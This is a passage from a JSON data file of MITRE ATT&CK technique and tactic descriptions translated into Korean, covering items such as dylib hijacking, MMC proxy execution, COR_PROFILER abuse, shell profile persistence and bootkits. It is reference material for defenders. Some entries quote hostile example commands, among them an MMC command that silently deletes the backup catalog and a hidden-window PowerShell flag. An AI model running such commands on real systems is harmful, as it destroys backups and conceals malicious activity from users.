    "description": "적대자는 희생 애플리케이션이 런타임 중 검색하는 경로에 예상된 이름의 악성 동적 라이브러리(dylib)를 배치하여 자신의 페이로드를 실행할 수 있습니다. 동적 로더는 검색 경로의 순차적인 순서에 따라 dylib를 찾으려고 시도합니다. dylib에 대한 경로는 <code>@rpath</code>로 접두사가 붙을 수 있으며, 이를 통해 개발자는 실행 파일의 위치를 기반으로 런타임 중 사용될 검색 경로 배열을 지정하기 위해 상대 경로를 사용할 수 있습니다. 또한, <code>LC_LOAD_WEAK_DYLIB</code> 함수와 같은 약한 링크가 사용되는 경우, 기대한 dylib가 없더라도 애플리케이션은 여전히 실행될 것입니다. 약한 링크는 개발자가 새로운 API가 추가됨에 따라 여러 macOS 버전에서 애플리케이션을 실행할 수 있도록 합니다.\n\n적대자는 식별된 경로에 누락된 dylib의 이름을 가진 악성 dylib를 삽입하여 실행을 얻을 수 있습니다. dylib는 애플리케이션의 주소 공간에 로드되어 악성 dylib가 애플리케이션의 권한 수준과 자원을 상속받도록 합니다. 애플리케이션에 따라 이는 권한 상승 및 무제한 네트워크 접근을 초래할 수 있습니다. 이 방법은 실행이 합법적인 프로세스 아래에 가려지기 때문에 보안 제품의 탐지를 피할 수도 있습니다.",
    "external_id": "T1574.004",
    "modified": "2023-03-30T21:01:39.601Z",
    "translated": true
  },
  {
    "title": "Downgrade System Image",
    "description": "적대자는 네트워크 장치의 운영 체제의 이전 버전을 설치하여 보안을 약화시킬 수 있습니다. 네트워크 장치의 구형 운영 체제 버전은 일반적으로 암호화 알고리즘이 약하고, 방어 기능이 적거나 덜 업데이트되어 있습니다.\n\n임베디드 장치에서는 버전을 다운그레이드하는 것이 일반적으로 저장소에 있는 운영 체제 파일을 교체하는 것만으로 이루어집니다. 대부분의 임베디드 장치에서는 원하는 운영 체제 파일의 복사본을 다운로드하고, 다음 시스템 재시작 시 해당 파일에서 부팅하도록 장치를 재구성함으로써 이를 달성할 수 있습니다. 적대자는 장치를 재시작하여 즉시 변경 사항을 적용할 수 있으며, 또는 다음 시스템 재시작을 기다릴 수도 있습니다.\n\n시스템 이미지를 이전 버전으로 다운그레이드하면 적대자가 [암호화 약화]와 같은 동작을 활성화하여 방어를 회피할 수 있습니다. 시스템 이미지의 다운그레이드는 독립적으로 수행될 수 있으며, [시스템 이미지 패치]와 함께 사용될 수도 있습니다.",
    "external_id": "T1601.002",
    "modified": "2020-10-22T17:49:02.660Z",
    "translated": true
  },
  {
    "title": "Local Accounts",
    "description": "적대자는 초기 접근, 지속성, 권한 상승 또는 방어 회피 수단으로 로컬 계정의 자격 증명을 획득하고 악용할 수 있습니다. 로컬 계정은 조직이 사용자, 원격 지원, 서비스 또는 단일 시스템이나 서비스에서 관리 목적으로 사용하도록 구성한 계정입니다.\n\n로컬 계정은 권한 상승 및 자격 증명 수집을 위해 악용될 수 있습니다. 암호 재사용은 권한 상승 및 측면 이동을 목적으로 네트워크의 여러 머신에 걸쳐 로컬 계정을 악용할 수 있게 합니다.",
    "external_id": "T1078.003",
    "modified": "2024-10-15T16:36:36.681Z",
    "translated": true
  },
  {
    "title": "Exploitation for Defense Evasion",
    "description": "적대자는 시스템이나 애플리케이션의 취약점을 악용하여 보안 기능을 우회할 수 있습니다. 취약점의 악용은 적대자가 프로그램, 서비스 또는 운영 체제 소프트웨어 또는 커널 내의 프로그래밍 오류를 이용해 자신이 통제하는 코드를 실행할 때 발생합니다. 방어용 보안 소프트웨어에도 취약점이 존재할 수 있으며, 이는 비활성화하거나 우회하는 데 사용될 수 있습니다.\n\n적대자는 환경 내에 보안 소프트웨어가 존재한다는 사전 지식을 갖추고 있을 수 있으며, 시스템이 손상된 직후 또는 그 과정에서 보안 소프트웨어 탐지 작업을 수행할 수 있습니다. 보안 소프트웨어는 악용을 위해 직접 타겟이 될 가능성이 높습니다. 지속적인 위협 그룹이 탐지를 피하기 위해 안티바이러스 소프트웨어를 목표로 삼는 사례도 있습니다.\n\n또한, 방어 경계를 우회할 수 있는 SaaS 애플리케이션의 공공 클라우드 인프라 내 취약점 사례도 존재합니다.",
    "external_id": "T1211",
    "modified": "2023-10-15T11:41:47.274Z",
    "translated": true
  },
  {
    "title": "Trusted Developer Utilities Proxy Execution",
    "description": "적대자는 신뢰할 수 있는 개발자 유틸리티를 이용해 악성 페이로드의 실행을 프록시할 수 있습니다. 소프트웨어 개발 관련 작업에 사용되는 많은 유틸리티가 있으며, 이는 개발, 디버깅 및 리버스 엔지니어링을 돕기 위해 다양한 형태의 코드를 실행하는 데 사용될 수 있습니다. 이러한 유틸리티는 종종 합법적인 인증서로 서명되어 시스템에서 실행될 수 있으며, 신뢰할 수 있는 프로세스를 통해 악성 코드 실행을 프록시하여 애플리케이션 제어 솔루션을 효과적으로 우회할 수 있습니다.",
    "external_id": "T1127",
    "modified": "2022-05-05T05:00:37.443Z",
    "translated": true
  },
  {
    "title": "System Shutdown/Reboot",
    "description": "적대 세력은 시스템에 대한 접근을 중단시키거나 시스템의 파괴를 돕기 위해 시스템을 종료하거나 재부팅할 수 있습니다. 운영 체제에는 기계나 네트워크 장치를 종료하거나 재부팅하는 명령이 포함될 수 있습니다. 경우에 따라 이러한 명령은 원격 컴퓨터나 네트워크 장치를 종료하거나 재부팅하는 데 사용될 수 있습니다.\n\n시스템을 종료하거나 재부팅하는 것은 합법적인 사용자의 컴퓨터 자원 접근을 방해할 수 있으며, 사건 대응 및 복구를 저해할 수 있습니다.\n\n적대 세력은 시스템에 영향을 미친 후 시스템을 종료하거나 재부팅하려고 시도할 수 있으며, 이는 시스템 가용성에 대한 의도된 효과를 신속하게 달성하기 위한 방법입니다.",
    "external_id": "T1529",
    "modified": "2023-03-22T20:45:22.531Z",
    "translated": true
  },
  {
    "title": "MMC",
    "description": "대적자는 mmc.exe를 악성 .msc 파일의 프록시 실행에 악용할 수 있습니다. Microsoft 관리 콘솔(MMC)은 Microsoft에 의해 서명될 수 있는 이진 파일로, 그래픽 사용자 인터페이스(GUI) 또는 명령 프롬프트에서 여러 방법으로 사용됩니다. MMC는 Microsoft에서 생성한 관리 도구를 포함하는 사용자 정의 콘솔을 생성, 열기 및 저장하는 데 사용될 수 있습니다. 이러한 관리 도구는 스냅인이라고 불리며, 로컬 또는 원격으로 Windows 시스템을 관리하는 데 사용될 수 있습니다. 또한 MMC는 시스템 구성을 관리하기 위해 Microsoft가 생성한 .msc 파일을 여는 데에도 사용될 수 있습니다.\n\n대적자는 MMC 명령을 사용하여 악의적인 작업을 수행할 수 있습니다. 예를 들어, `mmc wbadmin.msc delete catalog -quiet` 명령은 사용자에게 프롬프트 없이 시스템의 백업 카탈로그를 삭제합니다(참고: `wbadmin.msc`는 기본적으로 Windows Server 운영 체제에만 있을 수 있습니다).\n\n대적자는 또한 MMC를 악성 .msc 파일 실행에 악용할 수 있습니다. 예를 들어, 대적자는 먼저 고유하게 [컴포넌트 오브젝트 모델](https://attack.mitre.org/techniques/T1559/001) 클래스 객체를 식별하는 악성 레지스트리 클래스 식별자(CLSID) 하위 키를 생성할 수 있습니다. 그런 다음 대적자는 악성 CLSID 하위 키에 연결된 “웹 주소 링크” 스냅인을 사용하여 사용자 정의 콘솔을 생성할 수 있습니다. .msc 파일이 저장되면, 대적자는 다음 명령으로 악성 CLSID 페이로드를 호출할 수 있습니다: `mmc.exe -Embedding C:\\path\\to\\test.msc`.",
    "external_id": "T1218.014",
    "modified": "2022-05-20T17:41:16.112Z",
    "translated": true
  },
  {
    "title": "Process Argument Spoofing",
    "description": "적대자는 프로세스 메모리를 덮어씀으로써 프로세스 명령줄 인수를 숨기려 할 수 있습니다. 프로세스 명령줄 인수는 프로세스에 대한 다양한 정보를 저장하는 Windows의 데이터 구조인 프로세스 환경 블록(PEB)에 저장됩니다. PEB는 프로세스를 실행할 때 참조되는 프로세스 명령줄 인수를 포함합니다. 프로세스가 생성될 때 프로세스 생성을 모니터링하는 방어 도구/센서는 PEB에서 프로세스 인수를 가져올 수 있습니다.\n\n적대자는 방어를 회피하기 위해 프로세스 PEB를 조작할 수 있습니다. 예를 들어, 프로세스 홀로잉 기법을 악용하여 정상적인 인수로 프로세스를 일시 정지 상태로 생성할 수 있습니다. 프로세스가 생성되고 PEB가 초기화된 후(그리고 프로세스 정보가 도구/센서에 의해 로그로 기록될 수 있는 상태에서), 적대자는 PEB를 덮어쓰고 명령줄 인수를 수정한 다음 악의적인 인수로 프로세스 실행을 재개할 수 있습니다.\n\n적대자는 악의적인 명령줄 인수로 프로세스를 실행한 후, 이후의 프로세스 메모리 분석을 우회할 수 있는 정상적인 인수로 메모리를 패치할 수도 있습니다.\n\n이러한 행위는 프로세스 기반 탐지를 조작하거나 더욱 회피하기 위해 다른 기법(예: 부모 PID 스푸핑)과 결합될 수도 있습니다.",
    "external_id": "T1564.010",
    "modified": "2021-11-29T15:56:50.370Z",
    "translated": true
  },
  {
    "title": "COR_PROFILER",
    "description": "적대자는 COR_PROFILER 환경 변수를 악용하여 .NET CLR을 로드하는 프로그램의 실행 흐름을 탈취할 수 있습니다. COR_PROFILER는 개발자가 각 .NET 프로세스에 로드될 비관리(또는 .NET 외부) 프로파일링 DLL을 지정할 수 있게 해주는 .NET Framework 기능입니다. 이러한 프로파일러는 .NET CLR에 의해 실행되는 관리 코드 모니터링, 문제 해결 및 디버깅을 위해 설계되었습니다.\n\nCOR_PROFILER 환경 변수는 다양한 범위(시스템, 사용자 또는 프로세스)에서 설정할 수 있으며, 그에 따라 영향력의 수준이 달라집니다. 시스템 및 사용자 전체 범위의 환경 변수는 레지스트리에 명시되며, 여기서 구성 요소 객체 모델(COM) 객체를 프로파일러 DLL로 등록할 수 있습니다. 프로세스 범위의 COR_PROFILER는 레지스트리를 수정하지 않고도 메모리 내에서 생성할 수 있습니다. .NET Framework 4부터는 COR_PROFILER_PATH 환경 변수에 DLL의 위치만 명시하면 프로파일링 DLL을 등록할 필요가 없습니다.\n\n적대자는 COR_PROFILER를 악용하여 CLR이 호출될 때마다 모든 .NET 프로세스의 맥락에서 악성 DLL을 실행하는 지속성을 구축할 수 있습니다. 또한 COR_PROFILER는 피해자의 .NET 프로세스가 더 높은 권한 수준에서 실행되는 경우 권한 상승을 위해 사용될 수 있으며, .NET 프로세스가 제공하는 방어 수단을 후킹하고 저해하는 데에도 활용될 수 있습니다.",
    "external_id": "T1574.012",
    "modified": "2021-08-30T21:35:12.049Z",
    "translated": true
  },
  {
    "title": "Credential Access",
    "description": "적은 계정 이름과 비밀번호를 훔치려고 하고 있습니다.\n\n자격 증명 접근은 계정 이름과 비밀번호와 같은 자격 증명을 훔치는 기술로 구성됩니다. 자격 증명을 얻기 위해 사용되는 기술에는 키로깅이나 자격 증명 덤프가 포함됩니다. 합법적인 자격 증명을 사용하면 적이 시스템에 접근할 수 있게 되고, 탐지가 더 어렵게 되며, 자신의 목표를 달성하는 데 도움이 되는 추가 계정을 만들 수 있는 기회를 제공합니다.",
    "external_id": "TA0006",
    "modified": "2019-07-19T17:43:41.967Z",
    "translated": true
  },
  {
    "title": "Execution",
    "description": "적은 악성 코드를 실행하려고 합니다.\n\n실행은 적이 제어하는 코드가 로컬 또는 원격 시스템에서 실행되는 결과를 초래하는 기술로 구성됩니다. 악성 코드를 실행하는 기술은 종종 네트워크 탐색이나 데이터 도용과 같은 더 넓은 목표를 달성하기 위해 다른 전술의 기술과 함께 사용됩니다. 예를 들어, 적은 원격 액세스 도구를 사용하여 원격 시스템 탐색을 수행하는 PowerShell 스크립트를 실행할 수 있습니다.",
    "external_id": "TA0002",
    "modified": "2019-07-19T17:42:06.909Z",
    "translated": true
  },
  {
    "title": "Impact",
    "description": "적대자는 귀하의 시스템과 데이터를 조작, 중단 또는 파괴하려고 합니다.\n\n영향은 적대자가 가용성을 방해하거나 무결성을 손상시키기 위해 비즈니스 및 운영 프로세스를 조작하는 데 사용하는 기술로 구성됩니다. 영향에 사용되는 기술에는 데이터 파괴나 변조가 포함될 수 있습니다. 경우에 따라 비즈니스 프로세스가 정상적으로 보일 수 있지만, 적대자의 목표를 이롭게 하기 위해 변경되었을 수 있습니다. 이러한 기술은 적대자가 최종 목표를 달성하거나 기밀 유출에 대한 은폐 작업을 수행하는 데 사용될 수 있습니다.",
    "external_id": "TA0040",
    "modified": "2019-07-25T18:42:23.222Z",
    "translated": true
  },
  {
    "title": "Persistence",
    "description": "적대자는 자리를 유지하려고 하고 있습니다.\n\n지속성은 적대자가 재시작, 변경된 자격 증명 및 접근을 차단할 수 있는 다른 중단을 넘어 시스템에 대한 접근을 유지하기 위해 사용하는 기술로 구성됩니다. 지속성을 위한 기술에는 합법적인 코드를 교체하거나 탈취하거나 시작 코드를 추가하는 것과 같이 시스템에 대한 입지를 유지할 수 있도록 하는 모든 접근, 작업 또는 구성 변경이 포함됩니다.",
    "external_id": "TA0003",
    "modified": "2019-07-19T17:42:33.899Z",
    "translated": true
  },
  {
    "title": "Privilege Escalation",
    "description": "상대방은 더 높은 수준의 권한을 얻으려고 하고 있습니다.\n\n권한 상승은 상대방이 시스템이나 네트워크에서 더 높은 수준의 권한을 얻기 위해 사용하는 기술들을 포함합니다. 상대방은 종종 비권한 액세스로 네트워크에 진입하고 탐색할 수 있지만, 목표를 달성하기 위해서는 상승된 권한이 필요합니다. 일반적인 접근 방식은 시스템의 약점, 잘못된 구성 및 취약점을 이용하는 것입니다. 상승된 접근의 예로는 다음과 같은 것들이 있습니다:\n\n* 시스템/root 수준\n* 로컬 관리자\n* 관리자 권한 유사 접근 권한이 있는 사용자 계정\n* 특정 시스템에 접근하거나 특정 기능을 수행할 수 있는 사용자 계정\n\n이러한 기술은 종종 지속성 기술과 겹칩니다. 왜냐하면 상대방이 지속적으로 존재할 수 있도록 하여 실행되는 운영 체제 기능이 상승된 맥락에서 실행될 수 있기 때문입니다.",
    "external_id": "TA0004",
    "modified": "2021-01-06T14:21:21.641Z",
    "translated": true
  },
  {
    "title": "Lateral Movement",
    "description": "적대자는 당신의 환경을 통과하려 하고 있습니다.\n\n수평 이동은 적대자들이 네트워크의 원격 시스템에 접근하고 제어하기 위해 사용하는 기술들을 포함합니다. 그들의 주요 목표를 달성하기 위해 종종 네트워크를 탐색하여 목표를 찾고 이후에 접근 권한을 얻어야 합니다. 목표에 도달하는 과정에서 여러 시스템과 계정을 통해 피벗을 하는 경우가 많습니다. 적대자는 수평 이동을 달성하기 위해 자신의 원격 접근 도구를 설치하거나, 네이티브 네트워크 및 운영 체제 도구에 대해 합법적인 자격 증명을 사용할 수 있으며, 이는 더 은밀할 수 있습니다.",
    "external_id": "TA0008",
    "modified": "2019-07-19T17:44:36.953Z",
    "translated": true
  },
  {
    "title": "Defense Evasion",
    "description": "적대자는 감지되지 않도록 노력하고 있다.\n\n방어 회피는 적대자가 타협 과정에서 감지를 피하기 위해 사용하는 기술들로 구성된다. 방어 회피에 사용되는 기술에는 보안 소프트웨어를 제거하거나 비활성화하는 것, 데이터와 스크립트를 난독화하거나 암호화하는 것이 포함된다. 적대자는 또한 신뢰할 수 있는 프로세스를 이용하고 악용하여 자신의 악성코드를 숨기고 가장할 수 있다. 다른 전술의 기술들은 이러한 기술이 방어를 전복하는 추가 이점을 포함할 때 여기에서 교차 목록화된다.",
    "external_id": "TA0005",
    "modified": "2019-07-19T17:43:23.473Z",
    "translated": true
  },
  {
    "title": "Exfiltration",
    "description": "공격자는 데이터를 훔치려 하고 있습니다.\n\n데이터 유출은 공격자가 네트워크에서 데이터를 훔치는 데 사용할 수 있는 기술로 구성됩니다. 데이터가 수집되면 공격자는 종종 이를 포장하여 제거하는 동안 탐지를 피합니다. 여기에는 압축과 암호화가 포함될 수 있습니다. 목표 네트워크에서 데이터를 빼내는 기술은 일반적으로 명령 및 제어 채널이나 다른 채널을 통해 전송하는 것을 포함하며, 전송에 크기 제한을 두는 것도 포함될 수 있습니다.",
    "external_id": "TA0010",
    "modified": "2019-07-19T17:45:12.806Z",
    "translated": true
  },
  {
    "title": "Discovery",
    "description": "적대자는 귀하의 환경을 파악하려고 하고 있습니다.\n\n탐색은 적대자가 시스템 및 내부 네트워크에 대한 정보를 얻기 위해 사용할 수 있는 기술로 구성됩니다. 이러한 기술은 적대자가 환경을 관찰하고 행동 방침을 결정하기 전에 자신을 orient할 수 있도록 도와줍니다. 또한 적대자가 자신이 제어할 수 있는 것과 진입 지점 주변의 내용을 탐색하여 현재 목표에 어떻게 도움이 될 수 있는지를 발견하게 합니다. 네이티브 운영 체제 도구는 종종 이러한 정보 수집 목표를 위해 사용됩니다.",
    "external_id": "TA0007",
    "modified": "2019-07-19T17:44:13.228Z",
    "translated": true
  },
  {
    "title": "Collection",
    "description": "적은 자신의 목표에 관심 있는 데이터를 수집하려 합니다.\n\n수집은 적들이 정보를 모으기 위해 사용할 수 있는 기술과 적의 목표를 달성하는 데 관련된 정보 출처를 포함합니다. 데이터를 수집한 후의 흔한 목표는 해당 데이터를 훔치거나(exfiltrate) 데이터를 사용하여 목표 환경에 대한 더 많은 정보를 얻는 것입니다. 일반적인 목표 출처로는 다양한 드라이브 유형, 브라우저, 오디오, 비디오 및 이메일이 있습니다. 일반적인 수집 방법으로는 스크린샷을 캡처하고 키보드 입력을 기록하는 것이 있습니다.",
    "external_id": "TA0009",
    "modified": "2024-09-05T18:27:09.070Z",
    "translated": true
  },
  {
    "title": "Resource Development",
    "description": "적대자는 작전을 지원할 수 있는 자원을 확보하려고 하고 있습니다.\n\n자원 개발은 적대자가 목표를 지원하는 데 사용할 수 있는 자원을 생성, 구매 또는 손상/탈취하는 기술로 구성됩니다. 이러한 자원에는 인프라, 계정 또는 기능이 포함됩니다. 이러한 자원은 적대자가 명령 및 제어를 지원하기 위해 구매한 도메인, 초기 접근의 일환으로 피싱을 위한 이메일 계정 또는 방어 회피를 돕기 위해 코드 서명 인증서를 훔치는 등의 다른 단계에서 활용될 수 있습니다.",
    "external_id": "TA0042",
    "modified": "2020-09-30T16:31:36.322Z",
    "translated": true
  },
  {
    "title": "Reconnaissance",
    "description": "적은 미래 작전을 계획하는 데 사용할 정보를 수집하려고 하고 있습니다.\n\n정찰은 적들이 목표 지지를 위해 사용할 수 있는 정보를 적극적이거나 수동적으로 수집하는 기술로 구성됩니다. 이러한 정보에는 피해자 조직, 인프라 또는 직원에 대한 세부 사항이 포함될 수 있습니다. 이 정보는 적이 초기 접근 계획 및 실행, 합병 후 목표의 범위 및 우선순위 설정, 또는 추가 정찰 노력을 주도하는 등 적의 생애 주기의 다른 단계에서 도움을 주는 데 활용될 수 있습니다.",
    "external_id": "TA0043",
    "modified": "2020-10-18T02:04:50.842Z",
    "translated": true
  },
  {
    "title": "Command and Control",
    "description": "적대자는 손상된 시스템과 통신하여 이를 제어하려고 시도하고 있습니다.\n\n명령 및 제어는 적대자가 희생 네트워크 내에서 자신의 통제 하에 있는 시스템과 통신하기 위해 사용할 수 있는 기술로 구성됩니다. 적대자는 일반적으로 탐지를 피하기 위해 정상적이고 예상되는 트래픽을 모방하려고 합니다. 적대자가 명령 및 제어를 설정할 수 있는 방법은 여러 가지가 있으며, 이는 희생자의 네트워크 구조와 방어 수준에 따라 다양한 은폐 수준을 가집니다.",
    "external_id": "TA0011",
    "modified": "2019-07-19T17:45:30.644Z",
    "translated": true
  },
  {
    "title": "Initial Access",
    "description": "적은 네트워크에 침투하려 하고 있습니다.\n\n초기 접근은 네트워크 내에서 초기 기반을 확보하기 위해 다양한 진입 벡터를 사용하는 기술로 구성됩니다. 기반을 확보하기 위해 사용하는 기술에는 목표형 스피어 피싱 및 공개 웹 서버의 취약점 악용이 포함됩니다. 초기 접근을 통해 확보된 기반은 유효한 계정이나 외부 원격 서비스의 사용 등으로 지속적인 접근을 허용할 수 있으며, 비밀번호 변경으로 인해 제한된 사용이 될 수도 있습니다.",
    "external_id": "TA0001",
    "modified": "2019-07-19T17:41:41.425Z",
    "translated": true
  },
  {
    "title": "Indicator Removal from Tools",
    "description": "악성 도구가 탐지되어 격리되거나 다른 방식으로 차단될 경우, 공격자는 악성 도구가 탐지된 이유(지표)를 파악하고, 지표를 제거하여 도구를 수정한 후, 대상의 방어 시스템이나 유사한 시스템을 사용하는 이후의 대상들에 의해 더 이상 탐지되지 않는 업데이트된 버전을 사용할 수 있습니다.\n\n이와 유사한 사례는 맬웨어가 파일 서명으로 탐지되어 안티바이러스 소프트웨어에 의해 격리될 때 발생합니다. 맬웨어가 파일 서명 때문에 격리되었다는 사실을 파악한 공격자는 소프트웨어 패킹을 사용하거나 파일을 수정하여 다른 서명을 가지도록 한 후, 맬웨어를 재사용할 수 있습니다.",
    "external_id": "T1066",
    "modified": "2020-03-20T15:22:53.835Z",
    "translated": true
  },
  {
    "title": "Malicious Shell Modification",
    "description": "적대자는 사용자의 셸에서 트리거된 악성 명령을 실행함으로써 지속성을 확립할 수 있습니다. 사용자 셸은 세션 중 여러 시점에서 이벤트에 따라 여러 구성 스크립트를 실행합니다. 사용자가 명령줄 인터페이스를 열거나 원격으로 로그인할 때 로그인 셸이 시작됩니다. 로그인 셸은 시스템의 스크립트와 사용자의 홈 디렉터리에서 스크립트를 실행하여 환경을 구성합니다. 시스템의 모든 로그인 셸은 시작될 때 <code>/etc/profile</code>을 사용합니다. 이러한 구성 스크립트는 해당 디렉토리의 권한 수준에서 실행되며, 종종 환경 변수를 설정하고, 별칭을 생성하고, 사용자의 환경을 사용자화하는 데 사용됩니다. 셸이 종료되거나 종료될 때 추가 셸 스크립트가 실행되어 셸이 적절하게 종료되도록 합니다. \n\n적대자는 셸에 의해 자동으로 실행되는 스크립트에 명령을 삽입하여 지속성을 확립하려고 시도할 수 있습니다. 대부분의 GNU/Linux 시스템에 대한 기본 셸인 bash를 예로 들어, 적대자는 <code>/etc/profile</code> 및 <code>/etc/profile.d</code> 파일에 악성 이진 파일을 시작하는 명령을 추가할 수 있습니다. 이러한 파일은 루트 권한이 필요하며, 시스템의 어떤 셸이든 실행될 때마다 실행됩니다. 사용자 수준 권한의 경우, 적대자는 사용자가 명령줄 인터페이스를 열거나 원격으로 연결할 때 소싱되는 <code>~/.bash_profile</code>, <code>~/.bash_login</code>, 또는 <code>~/.profile</code>에 악성 명령을 삽입할 수 있습니다. 적대자는 시스템이 나열된 순서에서 존재하는 첫 번째 파일만 실행하기 때문에 ~/.bash_profile을 자주 사용합니다. 적대자는 또한 원격으로 연결이 설정되거나 추가 대화형 셸이 열릴 때 추가로 실행되는 <code>~/.bashrc</code> 파일을 활용했습니다. 일부 악성 소프트웨어는 프로그램의 종료를 타겟으로 하여 실행을 트리거할 수 있으며, 적대자는 세션 종료 시 <code>~/.bash_logout</code> 파일을 사용하여 악성 명령을 실행할 수 있습니다. \n\nmacOS의 경우, 이 기술의 기능은 유사하지만 macOS 10.15 이상의 기본 셸인 zsh를 활용합니다. Terminal.app이 열리면 애플리케이션은 zsh 로그인 셸과 zsh 대화형 셸을 시작합니다. 로그인 셸은 <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, <code>/etc/zlogin</code>을 사용하여 시스템 환경을 구성합니다. 로그인 셸은 그 다음에 <code>~/.zprofile</code> 및 <code>~/.zlogin</code>으로 사용자 환경을 구성합니다. 대화형 셸은 <code>~/.zshrc</code>를 사용하여 사용자 환경을 구성합니다. 종료 시 <code>/etc/zlogout</code> 및 <code>~/.zlogout</code>가 실행됩니다. 레거시 프로그램의 경우, macOS는 시작 시 <code>/etc/bashrc</code>를 실행합니다.",
    "external_id": "T1156",
    "modified": "2023-10-15T20:24:13.473Z",
    "translated": true
  },
  {
    "title": "Bootkit",
    "description": "부트킷은 하드 드라이브의 부트 섹터, 즉 마스터 부트 레코드(MBR)와 볼륨 부트 레코드(VBR)를 수정하는 악성코드 변형입니다.\n\n적대자는 운영 체제 아래의 계층에서 시스템에 지속적으로 존재하기 위해 부트킷을 사용할 수 있으며, 이는 조직이 부트킷이 사용되었다고 의심하고 적절히 행동하지 않는 한 완전한 수정 작업을 수행하기 어렵게 만들 수 있습니다.\n\n### 마스터 부트 레코드\nMBR은 BIOS에 의한 하드웨어 초기화가 완료된 후 처음 로드되는 디스크의 섹션입니다. 부트 로더의 위치입니다. 부트 드라이브에 대한 원시 접근 권한을 가진 적대자는 이 영역을 덮어씌워 부팅 과정 중 정상 부트 로더에서 적대 코드로 실행을 전환할 수 있습니다.\n\n### 볼륨 부트 레코드\nMBR은 부팅 프로세스의 제어를 VBR로 전달합니다. MBR의 경우와 유사하게, 부트 드라이브에 대한 원시 접근 권한을 가진 적대자는 VBR을 덮어씌워 부팅 중 실행을 적대 코드로 전환할 수 있습니다.",
    "external_id": "T1067",
    "modified": "2020-03-20T19:53:25.628Z",
    "translated": true
  },
  {
    "title": "Hidden Window",
    "description": "적대자는 숨겨진 창을 활용하여 사용자에게 악성 활동을 감추는 방법을 사용할 수 있습니다. 경우에 따라 애플리케이션이 작업을 수행할 때 일반적으로 표시되는 창을 숨길 수 있습니다. 이는 시스템 관리자가 관리 작업을 수행할 때 사용자 작업 환경을 방해하지 않기 위해 활용될 수 있습니다. 적대자는 운영 체제 기능을 악용하여 사용자가 보이는 창을 숨김으로써 시스템에서의 적대자 활동에 대한 사용자의 경고를 피할 수 있습니다.\n\n### Windows\nWindows의 스크립팅 언어에는 창을 숨기는 다양한 기능이 있습니다. 그 중 하나의 예는 `powershell.exe -WindowStyle Hidden`입니다.\n\n### Mac\nmacOS에서 애플리케이션이 실행되는 방식에 대한 구성은 속성 목록(plist) 파일에 나열됩니다. 이 파일의 태그 중 하나는 `apple.awt.UIElement`로, 이는 Java 애플리케이션이 Dock에 애플리케이션 아이콘이 나타나는 것을 방지합니다. 일반적으로 애플리케이션이 시스템 트레이에서 실행될 때 사용되지만, Dock에도 표시되지 않기를 원할 때 주로 사용됩니다. 그러나 적대자는 이 기능을 악용하여 실행 중인 창을 숨길 수 있습니다.",
    "external_id": "T1143",
    "modified": "2020-03-13T21:03:18.600Z",
    "translated": true
  },
  {
    "title": "LC_LOAD_DYLIB Addition",
    "description": "Mach-O 바이너리는 바이너리가 로드될 때 특정 작업을 수행하는 데 사용되는 일련의 헤더를 가지고 있습니다. Mach-O 바이너리의 LC_LOAD_DYLIB 헤더는 macOS와 OS X에 실행 중에 어떤 동적 라이브러리(dylib)를 로드해야 하는지를 알려줍니다. 이러한 라이브러리는 나머지 필드와 종속성에 대해 조정이 이루어지는 한 컴파일된 바이너리에 임시로 추가할 수 있습니다. 이러한 변경을 수행할 수 있는 도구들이 존재합니다. 변경이 이루어지면 바이너리가 수정되기 때문에 디지털 서명이 무효화됩니다. 공격자는 바이너리에서 LC_CODE_SIGNATURE 명령을 단순히 제거하여 로드 시간에 서명이 확인되지 않도록 하여 이 문제를 해결할 수 있습니다.",
    "external_id": "T1161",
    "modified": "2021-03-30T00:51:58.008Z",
    "translated": true
  },
  {
    "title": "Plist Modification",
    "description": "plist 파일은 macOS와 OS X가 애플리케이션 및 서비스를 구성하는 데 사용하는 모든 정보를 포함하고 있습니다. 이 파일들은 UTF-8로 인코딩되어 있으며 < >로 둘러싸인 일련의 키를 통해 XML 문서 형식으로 구성되어 있습니다. 이 파일들은 프로그램이 실행되어야 하는 시간, 실행 파일의 경로, 프로그램 인수, 필요한 OS 권한 등 여러 내용을 상세히 설명합니다. plist 파일은 그 목적에 따라 특정 위치에 저장되며, 예를 들어 /Library/Preferences(상승된 권한으로 실행됨)와 ~/Library/Preferences(사용자 권한으로 실행됨) 같은 위치에 있습니다. 공격자는 이러한 plist 파일을 수정하여 자신의 코드를 가리키게 하거나, 다른 사용자의 컨텍스트에서 자신의 코드를 실행하거나, 화이트리스트 절차를 우회하거나, 심지어 이를 지속성 메커니즘으로 사용할 수 있습니다.",
    "external_id": "T1150",
    "modified": "2022-04-22T18:49:20.520Z",
    "translated": true
  },
  {
    "title": "HISTCONTROL",
    "description": "<code>HISTCONTROL</code> 환경 변수는 사용자가 로그아웃할 때 <code>history</code> 명령어에 의해 저장될 내용과 최종적으로 <code>~/.bash_history</code> 파일에 저장될 내용을 추적합니다. 이 설정은 단순히 \"ignorespace\"로 설정하여 공백으로 시작하는 명령어를 무시하도록 구성할 수 있습니다. <code>HISTCONTROL</code>은 \"ignoredups\"로 설정하여 중복된 명령어를 무시하도록 설정할 수도 있습니다. 일부 리눅스 시스템에서는 기본값으로 \"ignoreboth\"로 설정되어 있어 앞의 두 가지 예시를 모두 포함합니다. 이는 “ ls”는 저장되지 않지만 “ls”는 history에 저장됨을 의미합니다. <code>HISTCONTROL</code>은 macOS에서 기본적으로 존재하지 않지만 사용자가 설정할 수 있으며 이를 존중합니다. 적들은 모든 터미널 명령어에 공백을 추가하여 흔적을 남기지 않고 작업할 수 있습니다.",
    "external_id": "T1148",
    "modified": "2020-02-21T20:57:38.015Z",
    "translated": true
  },
  {
    "title": "Digital Certificates",
    "description": "적대자들은 타겟팅에 사용할 수 있는 피해자에 대한 정보를 찾기 위해 공개 디지털 인증서 데이터를 검색할 수 있습니다. 디지털 인증서는 서명된 콘텐츠의 출처를 암호학적으로 검증하기 위해 인증 기관(CA)에서 발급됩니다. 이러한 인증서는 암호화된 웹 트래픽(HTTPS SSL/TLS 통신)에 사용되는 것과 같이 등록된 조직에 대한 이름과 위치와 같은 정보를 포함하고 있습니다.\n\n적대자들은 디지털 인증서 데이터를 검색하여 실행 가능한 정보를 수집할 수 있습니다. 위협 행위자는 온라인 자원과 조회 도구를 사용하여 인증서에 대한 정보를 수집할 수 있습니다. 디지털 인증서 데이터는 또한 조직에서 서명한 아티팩트에서 사용할 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원 확보 및 초기 접근 방식에 대한 정보를 제공할 수 있습니다.",
    "external_id": "T1596.003",
